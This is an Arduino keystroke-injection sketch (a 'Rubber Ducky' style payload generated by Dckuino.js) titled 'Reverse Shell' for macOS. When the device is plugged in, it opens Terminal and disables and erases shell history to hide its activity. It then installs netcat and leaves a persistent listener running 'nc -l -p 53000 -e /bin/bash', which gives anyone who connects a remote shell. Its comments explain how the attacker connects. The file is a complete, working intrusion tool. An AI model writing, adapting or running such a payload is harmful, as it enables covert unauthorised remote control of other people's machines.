// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // installs netcat using home-brew (can adjust delay)
  // Runs the command nohup nc -l -p 53000 -vvv -e /bin/bash to start a netcat listener on port 53000
  // clears the terminal
  // Gui m minimizes the terminal window
  // Now on your separate computer in your terminal Run the command 'nc <remote-ip> 53000'
  // replace '<remote-ip>' with the IP address of the target computer.
  // I've noticed that NC does not respond if you copy and paste so please type the I.P. out!
  // If the connection is successful, you should now have a remote shell session on the remote computer.
  // To kill the listening port (53000 in this case)
  // you can use the kill command followed by the process ID (PID#)
  // to find the PID use command 'ps -ef | grep "nc -lvp 53000"'
  // Once you have the PID # run the command 'kill <PID#>'
  // to check if the port is closed
  // on the target computer run the command 'netstat -tuln | grep 53000'
  // If the listening port is closed, there should be no output or listing for port 53000.
  // Requirements: install netcat on both the remote target and your computer 'brew install netcat'
  // Requirements: Remote computer's IP address or hostname
  // Title: Reverse Shell
  // Author: NARSTY
  // Target: MacOS
  // Version: 1.0
  // Category: Recon
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("echo -e \"export HISTCONTROL=ignorespace\\nunset HISTFILE\" >> ~/.bashrc && source ~/.bashrc && exec bash");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" brew install netcat");

  delay(250);

  typeKey(KEY_RETURN);

  delay(15000);

  Keyboard.print(" nohup nc -l -p 53000 -vvv -e /bin/bash &");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" clear");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}